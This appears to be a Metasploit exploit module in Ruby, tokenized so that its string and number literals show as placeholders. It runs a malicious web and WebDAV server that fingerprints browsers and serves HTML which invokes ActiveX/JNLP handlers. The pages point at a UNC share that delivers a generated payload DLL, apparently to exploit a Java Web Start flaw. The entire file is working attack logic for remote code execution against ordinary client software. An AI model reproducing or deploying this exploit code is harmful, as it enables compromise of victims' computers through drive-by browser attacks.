require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: EXE def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > true , <str> = > <str> } , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > <str> , <str> = > ARCH_X86 } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ OptPort . new ( <str> , [ true , <str> , <int> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) ] , self . class ) end def auto_target ( cli , request ) agent = request . headers [ <str> ] ret = nil if agent =~ <str> ret = targets [ <int> ] elsif agent =~ <str> ret = targets [ <int> ] else print_status ( <str> agent <str> ) end ret end def on_request_uri ( cli , request ) mytarget = target if target . name == <str> mytarget = auto_target ( cli , request ) if ( not mytarget ) send_not_found ( cli ) return end end if ( request . method == <str> and request . uri == <str> ) process_options ( cli , request , mytarget ) return end if ( request . uri =~ <str> ) send_not_found ( cli ) return end if ( request . uri == <str> ) or not ( request . uri =~ <str> ) if ( request . uri == <str> ) subdir = <str> + rand_text_alphanumeric ( <int> + rand ( <int> ) ) + <str> else subdir = request . uri + <str> end print_status ( <str> request . uri <str> subdir <str> ) send_redirect ( cli , subdir ) return else share_name = $1 end case request . method when <str> process_options ( cli , request , mytarget ) when <str> process_propfind ( cli , request , mytarget ) when <str> process_get ( cli , request , mytarget , share_name ) when <str> print_status ( <str> request . uri <str> ) send_not_found ( cli ) else print_error ( <str> request . method <str> ) end end def process_get ( cli , request , target , share_name ) print_status ( <str> request . uri <str> ) if ( request . uri =~ <str> ) print_status ( <str> ) return if ( ( p = regenerate_payload ( cli ) ) == nil ) dll_data = generate_payload_dll ( { <str> = > p . encoded } ) send_response ( cli , dll_data , { <str> = > <str> } ) else my_host = ( datastore [ <str> ] == <str> ) ? Rex :: Socket . source_address ( cli . peerhost ) : datastore [ <str> ] if ( datastore [ <str> ] ) unc = datastore [ <str> ] . dup else unc = <str> + my_host + <str> + share_name end jnlp = <str> + unc + <str> + rand_text_alphanumeric ( <int> + rand ( <int> ) ) + <str> docbase = rand_text_alphanumeric ( <int> + rand ( <int> ) ) if ( request . uri =~ <str> ) print_status ( <str> ) var_str = rand_text_alpha ( <int> + rand ( <int> ) ) var_obj = rand_text_alpha ( <int> + rand ( <int> ) ) var_obj2 = rand_text_alpha ( <int> + rand ( <int> ) ) var_obj3 = rand_text_alpha ( <int> + rand ( <int> ) ) js_jnlp = <str> js_jnlp << jnlp . dup . gsub ( <str> , <str> ) clsid = <str> html = <str> var_str <str> js_jnlp <str> var_obj <str> var_obj <str> clsid <str> var_obj <str> var_str <str> var_obj2 <str> var_obj2 <str> var_obj2 <str> var_obj2 <str> var_str <str> var_obj3 <str> var_obj3 <str> var_obj3 <str> var_obj3 <str> var_str <str> elsif ( request . uri =~ <str> ) print_status ( <str> ) clsids = [ <str> , <str> ] clsid = clsids [ rand ( clsids . length ) ] html = <str> var_obj <str> clsid <str> jnlp <str> docbase <str> jnlp <str> docbase <str> else print_status ( <str> ) js_uri = rand_text_alphanumeric ( <int> + rand ( <int> ) ) + <str> no_js_uri = rand_text_alphanumeric ( <int> + rand ( <int> ) ) + <str> html = <str> no_js_uri <str> js_uri <str> end send_response_html ( cli , html , { <str> = > <str> , <str> = > <str> } ) end end def process_options ( cli , request , target ) print_status ( <str> request . uri <str> ) headers = { <str> = > <str> , <str> = > <str> } send_response ( cli , <str> , headers ) end def process_propfind ( cli , request , target ) path = request . uri print_status ( <str> request . uri <str> ) body = <str> if ( path =~ <str> ) print_status ( <str> path <str> ) body = <str> path <str> elsif ( path =~ <str> ) or ( not path . sub ( <str> , <str> ) . index ( <str> ) ) print_status ( <str> path <str> ) body = <str> path <str> else print_status ( <str> path <str> ) send_not_found ( cli ) return end resp = create_response ( <int> , <str> ) resp . body = body resp [ <str> ] = <str> cli . send_response ( resp ) end def exploit if datastore [ <str> ] . to_i != <int> || datastore [ <str> ] != <str> fail_with ( Failure :: Unknown , <str> ) end super end end 
